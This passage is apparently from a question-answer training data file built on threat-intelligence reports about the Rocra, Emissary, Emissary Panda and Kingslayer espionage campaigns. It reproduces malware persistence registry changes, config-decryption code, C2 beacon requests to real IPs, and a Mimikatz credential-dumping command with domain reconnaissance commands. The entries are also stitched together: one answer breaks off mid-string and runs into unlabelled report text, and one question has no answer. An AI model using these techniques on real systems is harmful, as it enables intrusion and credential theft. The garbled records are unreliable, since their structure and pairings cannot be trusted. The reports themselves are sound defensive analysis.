server\nCollect information about installed software, most notably Oracle DB, RAdmin, IM software including Mail.Ru agent, drivers and software for Windows Mobile, Nokia, SonyEricsson, HTC, Android phones, USB drives\nExtract browsing history from Chrome, Firefox, Internet Explorer, Opera\nExtract saved passwords for Web sites, FTP servers, mail and IM accounts\nExtract Windows account hashes, most likely for offline cracking\nExtract Outlook account information\nDetermine the external IP address of the infected machine\nDownload files from FTP servers that are reachable from the infected machine (including those that are connected to its local network) using previously obtained credentials\nWrite and/or execute arbitrary code provided within the task\nPerform a network scan, dump configuration data from Cisco devices if available\nPerform a network scan within a predefined range and replicate to vulnerable machines using the MS08-067 vulnerability\nReplicate via network using previously obtained administrative credentials\nThe Rocra framework was designed by the attackers from scratch and hasn't been used in any other operations.\nMedium Headline: Were initial attacks launched at select \"high-profile\" victims or were they launched in series of larger (wave) attacks at organizations/victims?\nAll the attacks are carefully tuned to the specifics of the victims. For instance, the initial documents are customized to make them more appealing and every single module is specifically compiled for the victim\nwith a unique victim ID inside.\nLater, there is a high degree of interaction between the attackers and the victim - the operation is driven by the kind of configuration the victim has, which type of documents the use, installed software, native language and so on. Compared to Flame and Gauss, which are highly automated cyberespionage campaigns, Rocra is a lot more \"personal\" and finely tuned for the victims.\nMedium Headline: How does Operation Rocra compare to similar campaigns such as Aurora and Night Dragon? Any notable similarities or differences?\nCompared to Aurora and Night Dragon, Rocra is a lot more sophisticated. During our investigation we've uncovered over 1000 unique files, belonging to about 30 different module categories. Generally speaking, the Aurora and Night Dragon campaigns used relatively simple malware to steal confidential information.\nWith Rocra, the attackers managed to stay in the game for over 5 years and evade detection of most antivirus products while continuing to exfiltrate what must be hundreds of Terabytes by now.\nMedium Headline: How many Command & Control servers are there? Did Kaspersky Lab conduct any forensic analysis on them?\nDuring our investigation, we uncovered more than 60 domain names used by the attackers to control and retrieve data from the victims. The domain names map to several dozen IPs located mostly in Russia and Germany.\nHere's an overview of the Rocra's command and control infrastructure, as we believe it looks from our investigations:\nMore detailed information about the Command and Control servers will be revealed at a later date.\nRead the text above and answer this question: What are the primary industries and organizations targeted by the Rocra (Red October) cyber-espionage campaign? Why were these specific sectors chosen?",
    "output": "The Rocra campaign primarily targeted eight main categories: Government, Diplomatic/embassies, Research institutions, Trade and commerce, Nuclear/energy research, Oil and gas companies, Aerospace, and Military. These sectors were chosen because they hold sensitive and valuable information that can provide geopolitical intelligence and classified data, which can be sold or used for strategic purposes.",

    "instruction": "Big Headline: BACKGROUND\nCybercriminals are constantly evolving and adapting in their attempts to bypass computer network defenses. But, larger, more successful threat actors tend to evolve at a slower rate.\nAs long as these actors regularly achieve their objective (stealing sensitive data), they are not motivated to update or rethink their techniques, tactics, or procedures (TTPs). These threat actors' tactics follow the same principles of evolution \u2013 successful techniques propagate, and unsuccessful ones are abandoned. Attackers do not change their approach unless an external force or environmental shift compels them to. As the old saying goes: If it ain't broke, don't fix it.\nSo when a larger, successful threat actor changes up tactics, the move always piques our attention. Naturally, our first priority is ensuring that we detect the new or altered TTPs. But we also attempt to figure out why the adversary changed \u2014 what broke? \u2014 so that we can predict if and when they will change again in the future.\nWe observed an example of this phenomenon around May. About four months after The New York Times publicized an attack on its network, the attackers behind the intrusion deployed updated versions of their Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe malware families [2].\nThe previous versions of Aumlib had not changed since at least May 2011, and Ixeshe had not evolved since at least December 2011.\nWe cannot say for sure whether the attackers were responding to the scrutiny they received in the wake of the episode. But we do know the change was sudden. Akin to turning a battleship, retooling TTPs of large threat actors is formidable. Such a move requires recoding malware, updating infrastructure, and possibly retraining workers on new processes.\nThe following sections detail the changes to Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe.\nRead the text above and answer this question: Why did the attackers behind the intrusion on The New York Times' network suddenly change their tactics, techniques, and procedures (TTPs) after years of using the same methods? How does understanding this change help cybersecurity experts predict future shifts in APT behaviors?",
    "output": "The attackers behind the intrusion on The New York Times' network changed their TTPs likely due to increased scrutiny and publicity following the attack. This change was significant because the previous versions of their malware families, Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe, had remained unchanged for several years (since at least May 2011 and December 2011, respectively). The sudden alteration suggests that the attackers felt compelled to adapt their methods to avoid detection and maintain their effectiveness. Understanding this change helps cybersecurity experts predict future shifts in APT behaviors by recognizing that external forces or environmental shifts, such as increased public attention, can motivate even large, successful threat actors to update their TTPs. By monitoring for such triggers, experts can anticipate and prepare for potential changes in attacker strategies.",

    "instruction": "Medium Headline: Peacetime Operations\nDuring peacetime, China is likely to rely on cyber reconnaissance to gather information and catalogue exploits/weaknesses in the US military and infrastructure. Automobile companies, food services, oil companies, financial institutions, and telecommunications all play a vital role in supporting military operations, as well as housing technological advances, expertise, and inside information which could prove useful for leapfrogging (Winkler 2005).  Technology transfer allows China to skip years of costly research and development, and it removes the competitive edge of foreign militaries and companies (Tkacik 2007). In unrestricted fashion, China may also seek advantage during peacetime to battle military export restrictions of the EU, purchase vital capital in the US financial system, and help shape the international legal structure being developed for cyber warfare. Cyber reconnaissance against US military logistics networks could reveal force deployment information, such as the names of ships deployed, readiness status of various units, timing and destination of deployments, and rendezvous schedules. It could also reveal the details of weaponry sold to Taiwan.\nChina has repeatedly shown interest in the US Unclassified but Sensitive Internet Protocol Router Network (NIPRNet) (China's Proliferation Practices, and the Development of Its\nCyber and Space Warfare Capabilities 2008). NIPRNet is used to exchange unclassified but sensitive information between internal users. The network is connected to the broader internet to improve collaboration between scientists and officers located in different organizations and in remote locations. This means it can provide intruders with data such as 'ballistic weapons research, aircraft and ship design, military payroll, personnel records, procurement, modelling of battlefield environments, and computer security research' (Lewis 1994). The US places classified military information on the Secret Internet Protocol Router Network (SIPRNet) and secret information on the Joint Worldwide Intelligence Communications System (JWICS). While these networks are not connected to the internet, examining NIPRNet may give insight into the contents through cross talk, or it may provide a means of escalating privileges, providing information on how to access SIPRNet and JWICS either directly or indirectly via an asset.\nMedium Headline: Taiwan\nChina can use the internet to manipulate the Taiwanese populace, either to set up for an attack, or to undermine Taiwan independence peacefully and avoid conflict altogether. This may include PSYOPS/propaganda, recruitment and identification of sympathizers, or cataloguing of cyber and defence weaknesses. For example, an internet rumour in 1999 that a Chinese Su-27 had shot down a Taiwan aircraft caused the Taipei stock market to drop more than two percent in less than four hours. An earthquake in 1999 and a typhoon in 2001 revealed weaknesses in Taiwan's telecommunications, electric power, and transportation infrastructure; weaknesses which could be targeted in physical sabotage. Further, a landslide revealed that the loss of a single power grid tower is capable of knocking out 90 percent of the power grid in the central mountainous region. Building information, including the location of the President's office, and daily activities, are openly available on the internet.  This is even more significant given the lack of security present during the 2004 assassination attempt on President Chen Shui-bian and Vice President Annette Lu (China's Proliferation Practices, and the Development of Its Cyber and Space Warfare Capabilities 2008; Taiwan Assassin 2004).\nIn the event of a Taiwan conflict, China could use cyber attacks to delay US involvement long enough for Taiwan to capitulate. For example, China could go after the US logistical apparatus, using information gained via NIPRNet, in order to delay the force deployment phase. This would include the organization of forces, food supplies, uniforms, and/or communication which are often organised through networks that are connected to the internet. Cyber attack could also delay re-supply to the region by misdirecting stores, fuel, and munitions, corrupting or deleting inventory files, and thereby hindering mission capability. If the Chinese lack the capability to find exploits in NIPRNet, they could simply conduct DDoS attacks to bring it down long enough for a Taiwanese surrender. While delaying the US, China could use traditional military forces in concert with cyber warfare against Taiwan. The cyber warfare component could include online PSYOPS, media warfare, special forces aided by cyber reconnaissance information, and cyber attacks against Taiwan's point of sale and banking infrastructure.\nBig Headline: 6. Conclusion\nThis research has shown that China seeks to leapfrog in military competitiveness by utilizing cyber warfare. Chinese military doctrine places an emphasis on asymmetric attack. Cyber\nwarfare epitomizes this a low cost means of levelling the playing field. Cyber attack strikes at a superior adversary's weakness \u2013 in the case of the US, a heavy reliance on hi-tech computerized weaponry and a civilian population reliant on an unsecured computer infrastructure. Cyber reconnaissance follows China's tradition of technology transfer and reverse engineering for domestic production as a means of leapfrogging. Cyber reconnaissance gives the added benefit of providing deniability, low cost, a lack of legal framework against it, and the removal of geographical distance. Foreign allegations, such as the Titan Rain incursions, suggest China is making rapid progress in cyber reconnaissance and attack capabilities. The PRC openly states in its National Defense White Paper that it is seeking informationization and modernization of the PLA. This follows the US, China's perceived greatest threat, in its pursuit of NCW, IO, and FCS. Cataloguing adversary weaknesses not only provides an asymmetric advantage in the event of a conflict, it also acts as a deterrent while China catches up in traditional military might. By utilizing cyber reconnaissance, China can accelerate its advancement in hi-tech weaponry. Unrestricted warfare has shown a blurring of the lines between military and non-military spheres. China can tap into the power of its online population for military purposes, such as seen in the Estonian, Georgian and Chanology case studies. Following the US example of IO, China can leverage the internet as a means of boosting soft power. Using cyber reconnaissance, the Chinese can gain market dominance in the fields of ICT. This will provide increased cyber security, by removing foreign influence, and it will provide improved cyber offence, such as pre-installed exploits or ownership of internet infrastructure. Market dominance also relates to financial gain, which China has stated is intrinsically related to military capabilities and strategic interests.\nRead the text above and answer this question: Why does China view cyber warfare as a strategic advantage, and how does it align with their military doctrine and goals?",
    "output": "China views cyber warfare as a strategic advantage because it offers a low-cost means of leveling the playing field against superior adversaries, particularly those heavily reliant on high-tech computerized weaponry and unsecured civilian computer infrastructure.

The installation and loading portion of the Trojan is called using an exported function named \"Setting\", which moves the file to:\n1\n%TEMP%\\Remdisk.dll\nThe loading portion of this version of Emissary checks the permissions of the current user and either installs Emissary as a service or as a standalone Trojan. To install as a service, the loader will enumerate the services on the system looking for services running under the \"netsvcs\" group, and it will attempt to hijack the first \"netsvcs\" service by replacing the \"ServiceDLL\" parameter to point to the Emissary DLL. For instance, during the analysis period, the installation code changed the following registry key of the AppMgmt:\n1\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\AppMgmt\\Parameters\\ServiceDll:\n\"%SystemRoot%\\System32\\appmgmts.dll\"\nto\n1\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\AppMgmt\\Parameters\\ServiceDll:\n\"C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\Remdisk.dll\"\nIf the user does not have permissions to add a service, the installation routine attempts to add persistence by creating the following registry key that will run the functional code within Emissary via an exported function named \"DllRegister\":\n1 Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Resolves: \"Rundll32.exe\nC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\Remdisk. dll,DllRegister\"\nThis version of emissary has its configuration appended to the end of the DLL, specifically starting at offset 0xc600. The following code accesses the configuration embedded within the DLL and decrypts it using a single byte XOR algorithm using 65 as the key:\n1\n2 3 4\n5\n6\nSetFilePointer(v2, 0xC600, 0, 0);\nReadFile(h_emissary_dll_file, buffer_for_config, 0x1D0u, &NumberOfBytesRead, 0);\niteration_count = 0;\ndo\n*(iteration_count++ + buffer_for_config) += 65; while ( iteration_count < 0x1D0 );\nThis algorithm differs from the algorithm introduced in Emissary version 2.0 that used the srand and rand functions to generate a key to use in conjunction with the XOR operation. With the configuration embedded within the Emissary DLL, each Emissary version 4.0 sample will have a different hash as the configuration data changes.\nThe network beacon sent from Emissary version 4.0 is the same as other previous versions starting at version 2.0, as seen in the following:\n1\n2\n3\n4\n5\nGET /lightserver/Default.aspx HTTP/1.0\nCache\u00adControl: no\u00adcache\nUser\u00adAgent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\nHost: 210.209.121.92\nCookie: guid=7DA53AE4\u00adC155\u00ad40b3\u00ad8EB3\u00ad60C4FCE99025; op=1635b097\u00adffe4\u00ad4711\u00ad89e6\u00ad7f8c7f4cdca6\nVersion 3.0: Out\u00adof\u00adsequence\nDate: 6/25/2015\nSHA256: 70bed57bc3484fe5dbcf3c732bd7b11f80a742138f4733bc7e9b6d03e721da4a\nOriginal Name: IISDLL.dll\nMajor Overhaul\nThe compilation time of one sample of Emissary version 3.0 on June 25, 2015 appears out of order, as it occurs after the compilation of Emissary version 4.0. The differences between this out of order sample compared to the other known version 3.0 sample, as well as version 4.0 for that matter, include a dramatic change in configuration storage and the handling of commands. Also, the files stored on the system have different names than Emissary versions in the past, which are:\n1\n2\n3\n4\n5\n%TEMP%\\000IISA758C8FEAE5F.TMP \u00ad> Log file\n%APPDATA%\\LocalData\\75BD50EC.DAT \u00ad> Configuration file\n%APPDATA%\\LocalData\\A08E81B411.DAT \u00ad> Emissary DLL\nThis version of Emissary is designed to be injected into an Internet Explorer process by its associated loader Trojan, which marks the first time Emissary executes through DLL injection.\nThis version of Emissary also has a different configuration structure than prior versions. The configuration is no longer stored in the registry; rather it is saved to a file named 75BD50EC.DAT. The Emissary DLL will skip to offset 0x488 within this file and read the next 132 bytes, which it will decrypt with a new algorithm as seen in the following:\n1\n2\n3\n4\n5\n6\n7\n8\nSetFilePointer(h_config_file_1, 0x488, 0, 0);\nReadFile(h_config_file, buffer_for_config, 132u, &NumberOfBytesRead, 0);\nCloseHandle(h_config_file); srand(0xA03u); iteration_count = 0;\ndo\n*(buffer_for_config + iteration_count++) ^= rand() % 128; while ( iteration_count < 0x84 );\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\nstruct emissary_new_config {\nWORD Emissary_version_major;\nWORD Emissary_version_minor;\nCHAR[36] GUID_for_sample;\nWORD Unknown1;\nCHAR[128] Server1;\nCHAR[128] Server2;\nCHAR[128] Server3;\nCHAR[128] CampaignName;\nCHAR[550] Unknown2;\nWORD Delay_interval_seconds;\n};\nThis version of Emissary also introduced a new command handler that uses number\u00adbased commands instead of the GUID commands seen in prior versions of Emissary. The functionality of the commands are the same, however, the commands themselves are invoked using a number. Table 2 contains a list of available commands and a brief description of the functionality carried out by the command.\nThe network beacon sent from this version of Emissary is very similar to the beacon first introduced in Emissary version 2.0; however, the \"op\" value of \"101\" is hardcoded for the beacon and replaces the GUID based op designator to match the new command handler. The following is an example of the network beacon generated by this version of Emissary:\n1\n2\n3\n4\n5\nGET /default.aspx HTTP/1.1\nUser\u00adAgent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\nHost: 101.55.33.92\nCache\u00adControl: no\u00adcache\nCookie: guid=cae5e213\u00ad395a\u00ad4023\u00ad9a12\u00adf78d3c4718e5; op=101\nVersion 5.0\nDate: 8/25/2015\nSHA256: c145bb2e4ce77c79aa01de2aec4a8b5b0b680e23bceda2c230903b5f0e119634, Original Name: WinDLL.dll\nEmissary version 5.0 closely resembles the out\u00adof\u00adorder version 3.0 sample, which suggests that the malware author just forgot to change the version number of the out of order sample. While the configuration and Emissary DLL filenames used by the version 5.0 Emissary sample are the same as the out\u00adof\u00adorder version 3.0 sample, the log file name differs but only slightly, as seen in the following list of related files:\n1\n2\n3\n4\n5\n6\n7\n%TEMP%\\000A758C8FEAE5F.TMP \u00ad> Log File\n%APPDATA%\\LocalData\\75BD50EC.DAT \u00ad> Configuration file\n%APPDATA%\\LocalData\\A08E81B411.DAT \u00ad> Emissary DLL\n%APPDATA%\\LocalData\\ishelp.dll \u00ad> Loader DLL\nVersion 5.0 uses numbers within its command handler and the same configuration structure as the out\u00adof\u00adorder version 3.0. The only major change in 5.0 is the ability to obtain a compromised system's external IP address by performing an HTTP GET request to \"http://showip.net/index.php\". The code will parse the response from this webserver for the following to obtain the system's IP address:\n1\n<input id=\"checkip\" type=\"text\" name=\"check_ip\" value=\"[IP address parsed]\" />\nThe SID value sent from the C2 server is encrypted using an algorithm that uses the XOR operation on the data using 0x76 as the key on the first byte and the resulting cleartext byte as the key on the next byte and so on. The network beacon sent from this version of Emissary visually resembles the out\u00adof\u00adorder version, with the addition of a field \"SHO\" that contains the IP address of the compromised host. The following is an example of the Emissary version 5.0 network beacon, which is also the same in versions 5.1, 5.3 and 5.4 as well:\n1\n2\n3\n4\n5\nGET /default.aspx HTTP/1.1\nUser\u00adAgent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\nHost: 101.55.33.95\nCache\u00adControl: no\u00adcache\nCookie: guid=8cdef38c\u00ad808a\u00ad4e29\u00adaf6e\u00ad7386f02d28f1; op=101; SHO=172.16.107.130\nVersion 5.1\nDate: 9/29/2015\nSHA256: 375190cc8e0e75cf771d66347ea2a04b6d1b59bf2f56823eb81270618f133e2d\nOriginal Name: WinDLL.dll\nFor version 5.1 the malware author took out the exception handling in the Upload File command and obfuscated two strings within the Trojan to avoid detection. The strings exist in the Trojan in encrypted form and are decrypted using an algorithm that uses addition to each byte of ciphertext, using 65 (\"A\") as a key. The obfuscated strings, as seen below, involve the filename of the log file and the command prompt executable used to create the remote shell:\n\\xEF\\xEF\\xEF\\x00\\xF6\\xF4\\xF7\\x02\\xF7\\x05\\x04\\x00\\x04\\xF4\\x05\\xED\\x13\\x0C\\x0F =\n000A758C8FEAE5F.TMP\n\\x22\\x2C\\x23\\xED\\x24\\x37\\x24 = cmd.exe\nDate: 10/14/2015\nSHA256: e369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538\nOriginal Name: WinDLL.dll\nIn an attempt to avoid detection based on PE header hashes, version 5.1 was recompiled without making any changes.\nVersion 5.3\nDate: 11/7/2015\nSHA256: 29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051\nOriginal Name: WinDLL.dll\n\nQ: Describe the installation and persistence mechanisms employed by Emissary version 4.0.

    "instruction": "Small Headline: 6.6.3 Process Injection: Process Hollowing (1055.012)\nSince most of the manually executed commands, such as reconnaissance, were executed in the context of the legit process wermgr.exe, it is concluded that Emissary Panda performed process hollowing to avoid detection by security tools. This thesis is supported by the fact, that the executable related to the process ID is the legit wermgr.exe of Windows. Furthermore, the capability for process hollowing as well as the corresponding strings within the malware were identified during our malware analysis of HyperBro, which is described in Section (<>)8.3.\nThe following screenshot shows an excerpt of the EDR tool, which displays the reconnaissance activity in the context of wermgr.exe:\nSmall Headline: 6.6.4 Masquerading: Service (T1036.004), filename, and file location (T1036.005)\nOn several occasions, Emissary Panda tried to evade defenses by using names, which are associated with security tools. This fact was also mentioned in previous reports29 (<>). In the referenced reports, Emissary Panda used a legitimate Symantec executable. In the case of this attack, Emissary Panda used an executable, which is signed by CyberArk and named as the Microsoft Defender. Furthermore, the executable was placed in common paths for Microsoft Defender:\n\u25a1 C:\\Program Files (x86)\\Common Files\\windefenders\\msmpeng.exe\n\u25a1 C:\\Program Files (x86)\\Common Files\\windefenders\\vftrace.dll\n\u25a1 D:\\$recycle.bin\\\nAs already mentioned in Section (<>)6.4.1, the service used for persistence was also named after the Microsoft Defender.\nLast, the recycle bin was utilized to store the output-archives of the collection tool, as described in Section (<>)6.10.1.\n29\nSmall Headline: 6.7.1 OS Credential Dumping T1003\nIn order to gain valid credentials of accounts, Emissary Panda used techniques for credential dumping. This also explains the extensive use of valid accounts, as described in Section (<>)6.4.3. The following command was observed during the attack:\n$ msiexec.exe privilege::debug sekurlsa::logonPasswords\nThe command line parameters equal the parameters of the credential dumping tool Mimikatz30(<>). Since the process is running in a valid msiexec process, the attacker performed credential dumping in combination with process hollowing, as described in Section (<>)6.6.3.\nSmall Headline: 6.8.1 Account Discovery (T1087.001) and Permission Groups Discovery T1069\nTo gain more information about the Active Directory accounts and groups, Emissary Panda utilized the classic Windows net tool.\n$ net user <USER> /domain\n$ net1 user <ADMIN> /domain\n$ net group \"domain admins\" /domain\n$ net view \\\\<IP>\n$ net use \\\\<IP>\\ipc$ <PASSWORD> **********\nApparently, the operator of Emissary Panda mixed up the order of username and password in the net use command. Hence, the password could be seen in clear-text and the username was redacted by the EDR.\nSmall Headline: 6.10.1 Archive via Utility (T1560.001) and Automated Collection (T1119)\nBased on the observed hashes and parameters, Emissary Panda was using Winrar to collect data in archives. The following commands show data collection performed on the fileserver:\nThe first command was launched remotely via WMIC on the fileserver. The collected files as well as the output archive is located on the fileserver. The second command writes its output not to the fileserver but to another compromised system in the recycle bin. Both commands use the same password to encrypt the archives (incl. file and directory names). Finally, both commands use different sizes for their partial archives, but the target directories are the same.\nSmall Headline: 6.11.1 Application Layer Protocol: Web Protocols T1071.001\nThe C2 communication was performed over HTTPS, which could be observed in the firewall logs. Since the content was encrypted no statement regarding the content can be made. Nevertheless, the backdoor on all compromised systems was sending beacons to the C2 IP addresses in regular intervals.\nVia memory analysis of a compromised systems the following post request with User Agent could be extracted:\nPOST /api/v2/ajax HTTP/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36\nContent-Length: 87\nHost: 87.98.190.184\nThe IP address 87.98.190.184 is one of the C2 IP addresses used by Emissary Panda.\nBig Headline: 7 OSINT analysis of C2 infrastructure\nObserved C2 communication as well as HyperBro artifacts were analyzed and researched for additional indicators and common attributes.\nIn the analyzed samples, HyperBro uses a HTTPS protocol endpoint under the following path: /api/v2/ajax. This is a unique web application path, which is very well suited for detecting HyperBro traffic. No legitimate applications or web installations have been identified that access this endpoint.\nFurthermore, we noted that multiple Emissary Panda C2 addresses share the identical Jarm hash 3fd3fd16d3fd3fd22c3fd3fd3fd3fdf20014c17cd0943e6d9e2fb9cd59862b as well as a specific *.cybo-cloud.com certificate:\nWe were able to directly confirm seven C2 IP addresses with this specific Jarm hash and TLS certificate combination. Passive DNS data suggests that also the following IP addresses might be related to Emissary Panda as these share the Jarm hash and TLS certificate as well. However, at the time of writing, this suspicion was not confirmed.\n104.168.143.39\n104.168.211.246\n138.124.180.56\n152.228.248.233\n154.38.118.188\n194.156.98.129\n45.76.208.198\n45.77.32.139\n47.75.189.54\n8.210.39.213\nIn addition, it was observed that Emissary Panda reacted to incident response activities via resolving their C2 domain dataanalyticsclub.com to the localhost IP address 127.0.0.1. Thereby, effectively hiding their C2 traffic. Hence, active HyperBro backdoors on webservers might be identified by reviewing the local access log for requests to the following path: /api/v2/ajax.\n\nAnswer this question based on the above context: What methods did Emissary Panda employ to masquerade as legitimate security tools and how were these methods implemented?",
    "output": "Emissary Panda employed several methods to masquerade as legitimate security tools. They used executables signed by CyberArk and named them after Microsoft Defender. These executables were placed in common paths for Microsoft Defender, such as 'C:\\\\Program Files (x86)\\\\Common Files\\\\windefenders\\\\msmpeng.exe' and 'C:\\\\Program Files (x86)\\\\Common Files\\\\windefenders\\\\vftrace.dll'. Additionally, they utilized the recycle bin to store the output archives of the collection tool. By mimicking legitimate security tools and placing files in expected locations, Emissary Panda aimed to evade detection and blend in with normal system operations.",

    "instruction": "Context: Medium Headline: AN IRRESISTIBLE ENTICEMENT FOR KINGSLAYER ACTORS\nAlthough we do not know the exact reasons the Kingslayer actors chose to subvert Alpha's software product, the list of possible end-users of the application likely served as a powerful motivator.  As stated earlier, a free application license was offered to subscribers of Alpha's event log information portal service. While we do not know how many of these subscribers took advantage of the free license and installed the application during the subversion window, it is logical that some did. Organizations who, at some time, subscribed to the event log portal are displayed on Alpha's website and include:\n\u2022 4 major telecommunications providers\n\u2022 10+ western military organizations\n\u2022 24+ Fortune 500 companies\n\u2022 5 major defense contractors\n\u2022 36+ major IT product manufacturers or solutions providers\n\u2022 24+ western government organizations\n\u2022 24+ banks and financial institutions\n\u2022 45+ higher educational institutions\n4\nBig Headline: ELEVEN AND A HALF WEEKS\nBecause we have an incomplete picture of the successful Kingslayer target set, our timeline has some significant gaps. One important gap begging for explanation was the time between when Alpha's websites and software distribution were remediated on 26 April 2015, and the time when forensic evidence shows that Kingslayer visited the Iota network on 15 July 2015 (Figure 3).\nOne might surmise that if Iota was of particular interest to the Kingslayer actors, then less than eleven and a half weeks would pass before exploitation of their target network. One possible explanation is that Iota was not a preferred target at all. Rather, the eleven and a half weeks was spent by the actors exploiting potentially more lucrative targets than Iota. In effect, RSA Research proposes that Iota was an inconsequential target, passed over for some sufficient time for more important exploitation to be executed. This is why a supply chain attack is attractive to threat actors; a single compromise within the supply chain can yield numerous targets with minimal additional effort.\nAlpha issued a Security Notification on their website on 30 June 2016 and updated the notification on July 17, 2016 at RSA's request, following findings from further investigation on Iota's network compromised by Kingslayer.\nMedium Headline: KINGSLAYER CONNECTIONS TO CODOSO AND SHELL_CREW\nThe Kingslayer backdoor, discovered during an RSA Research \"excavation\" into common C2 infrastructure and malware bytecode, shares tactics previously observed used by Shell_Crew, an adversary RSA Research reported on in January 2014 5 . The specific infrastructure overlapping with the Kingslayer campaign was tied to an adversary identified as Codoso by Palo Alto 6  and ProofPoint 7  in the first quarter of 2016, and the apparent operational infrastructure harvesting campaign that we call Schoolbell. We do not have high confidence that the Codoso perpetrators are directly related to the Shell_Crew activity encountered in 2013 and 2014, but we observed that they use common resources and tools. For one, Codoso and Shell_Crew use continuously evolving versions of malware for which no builder or source code has been found in the wild. These include older Derusbi variants, as well as the newly pressed Rekaf, TXER, PGV_ PVID and Bergard as described by ProofPoint, PaloAlto, and in the Schoolbell blog post. This indicates that they have some common, restricted source for this distinctive malware. Consistent common malware bytecode, strings, and encoding routines were also noted by other researchers such as Proofpoint. These attributes are, thus far, unique to the activity groups and have allowed RSA Research and others to track malware clusters as they appear in the wild. For consistency we will attribute the activity in the Kingslayer campaign to King-slayer, but acknowledge some risk of erroneously conflating it with other threat groups labeled variously by other researchers as Codoso, as well as historic activity that RSA Research has grouped together as Shell_Crew.\nThe clearest operational links between Kingslayer and other recent campaigns attributed to Codoso are overlapping domains and IP addresses used for C2 in 2015 and 2016. The Kingslayer C2 URL www.oraclesoft[.]net has temporal overlaps with identified infrastructure from seven other C2 domains and twelve unique C2 IP addresses associated with at least twenty four unique samples of malware attributed to Codoso by ProofPoint and Palo Alto (Figure 4, attached also in Annex), and described in the Schoolbell blogpost by RSA Research.\n5\n6\n7\nMedium Headline: RECALLING ANOTHER SOFTWARE SUPPLY-CHAIN ATTACK\nThe Kingslayer campaign shares similarities with another supply-chain attack. In the Monju Incident 8 the attackers subverted an otherwise legitimate software server by using a redirect to a different, unrelated website controlled by the actors. Like Kingslayer, the target system with the already installed software would attempt to get an update, but instead received a malicious payload purporting to be an update that consisted of the original application software bundled with a Trojan, instead of a legitimate update. In the Kingslayer attack, systems attempting to get updates to an already installed Windows operating systems log analysis software program were transparently redirected to a website controlled by the Kingslayer actors, in which the illegitimate website would download a subverted update executable. What may have differed from the Monju incident was the fact that while all software installations that attempted to update during the Kingslayer campaign received a malicious but otherwise functioning update, we do not know how many of them also received the secondary malware. It is this secondary malware that has not yet been found in the wild.\nWe have no evidence to suggest the actors behind the Monju Incident and King-slayer are related, other than they used one or more of the same tactics.\n8\nMedium Headline: KINGSLAYER'S MEMORY-RESIDENT BROTHER, THE K2 TROJAN\nRSA Research believes all of the particular Alpha application installations attempting to update during the 17 day Kingslayer subversion window received a malicious but otherwise functioning update. We do not know how many of them also received the secondary malware. Using passive analysis, RSA Research was able to identify the probable beaconing activity pattern used by the secondary malware. Like the Kingslayer backdoor loader, the secondary malware used the domain www.oraclesoft[.]net for C2. We have dubbed this secondary malware \"Kingslayer Two\" or \"K2.\" The beaconing pattern of K2 differed from the King-slayer backdoor that loaded it. K2 beacons every ten minutes without a defined sleep period. Based on passively observed beacon activity from three different K2-infected systems, we believe K2's HTTP GET beacon pattern is a three to four digit load identifier that may represent the K2 malware load sequence assigned to each unique infection. This number appeared to be both unique, and static for each infected system. So 3423 in Table 1 might represent the 3,423rd unique system loaded with the K2 Trojan.\nTable 1 Kingslayer secondary malware K2 with possible load identifier highlighted in yellow\nGET /softs/updatecheck.html?3423&464336 HTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0) Host: www.oraclesoft.net\nRSA Research also has insight into K2 Trojan's capabilities based on the artifacts left on a system that had K2 installed. (See Appendix B) From the forensic artifacts, RSA Research infers that K2's capabilities include:\n\u2022 running arbitrary Windows shell commands with SYSTEM-level privileges,\n\u2022 upload and download of files, and\n\u2022 execution of programs uploaded by the attackers.\nMedium Headline: WHY SOFTWARE SUPPLY-CHAIN ATTACKS ARE HERE TO STAY\nSupply-chain attacks provide strategic advantages to attackers for several reasons. First, they provide one compromise vector to multiple potential targets. Second, supply chain exploitation attacks, by their very nature, are stealthy and have the potential to provide the attacker access to their targets for a much longer period than malware delivered by other common means, by evading traditional network analysis and detection tools. And finally, software supply chain attacks offer considerable \"bang for the buck\" against otherwise hardened targets9 .\n9\nIn the case of Kingslayer, this especially rings true because the specific system-administrator-related systems most likely to be infected offer the ideal beachhead and operational staging environment for systematic exploitation of a large enterprise.\nSubverting an application used almost exclusively by enterprise Windows system administrators gives the perpetrators direct access to the most sensitive parts on an organization's network via a workstation or server used regularly by the \"king of the network.\" A system administrator's workstation and cache of credentials invariably provides the most access of any system on an enterprise network. In our experience, the credentials maintained by system administrators usually enable extensive access to internal and external network infrastructure of even the most sensitive organization's enterprise. RSA Research observed Kingslayer installed on the workstation of the senior systems administrator at one organization and on the domain controllers of another organization. We assess that installations of the targeted application on workstations or servers with unprivileged users would be exceptions, rather than the rule, because the purpose of the targeted log analyzer software is to be used by system, security, and other privileged administrators.\nAnswer this question: How does the Kingslayer campaign compare to the Monju Incident in terms of tactics and outcomes, and what unique aspect of the Kingslayer attack sets it apart?",
    "output": "Both the Kingslayer campaign and the Monju Incident involved subverting legitimate software updates to deliver malicious payloads. However, in the Kingslayer attack, all software installations attempting to update received a malicious but functioning update, whereas it is unknown how many received the secondary malware, which has not been found in the wild. This secondary malware, dubbed 'K2,' used the domain www.oraclesoft[.]net for C2 and had a distinct beaconing pattern, beaconing every ten minutes without a defined sleep period.",

